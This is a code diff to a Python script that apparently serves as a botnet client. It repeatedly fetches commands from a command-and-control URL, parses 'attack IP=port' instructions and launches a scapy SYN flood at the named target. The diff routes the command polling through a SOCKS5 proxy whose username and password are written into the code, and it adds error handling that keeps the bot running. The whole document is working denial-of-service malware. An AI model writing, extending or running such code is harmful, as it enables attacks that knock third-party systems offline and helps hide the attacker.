@@ -1,9 +1,17 @@
 import requests
 import re
 from scapy.all import *
+import time
 
 # Define variables
 url = "http://chathere.getenjoyment.net/apk_payload/index2.php"
+proxy = "socks5://rduvmedi:ktnk2cx55f1y@38.154.227.167:5868"  # Your SOCKS5 proxy
+
+# Setup proxies for requests
+proxies = {
+    "http": proxy,
+    "https": proxy
+}
 
 def extract_ip_port(command):
     pattern = r"attack (\d+\.\d+\.\d+\.\d+)=(\d+)"
@@ -38,22 +46,27 @@ def syn_flood(ip, port):
 
 def listen_for_commands():
     while True:
-        response = requests.get(url)
-        
-        if response.status_code == 200:
-            command = response.text.strip()
+        try:
+            # Make the HTTP request with the proxy settings
+            response = requests.get(url, proxies=proxies)
             
-            if command.startswith("attack"):
-                ip, port = extract_ip_port(command)
+            if response.status_code == 200:
+                command = response.text.strip()
                 
-                if ip and port:
-                    syn_flood(ip, port)
+                if command.startswith("attack"):
+                    ip, port = extract_ip_port(command)
+                    
+                    if ip and port:
+                        syn_flood(ip, port)
+                    else:
+                        print(f"Invalid command format: {command}")
                 else:
-                    print(f"Invalid command format: {command}")
+                    print(f"Unknown command: {command}")
             else:
-                print(f"Unknown command: {command}")
-        else:
-            print("Failed to fetch command from URL.")
+                print("Failed to fetch command from URL.")
+            
+        except requests.exceptions.RequestException as e:
+            print(f"Error fetching command: {e}")
         
         # Wait for 5 seconds before checking again
         time.sleep(5)
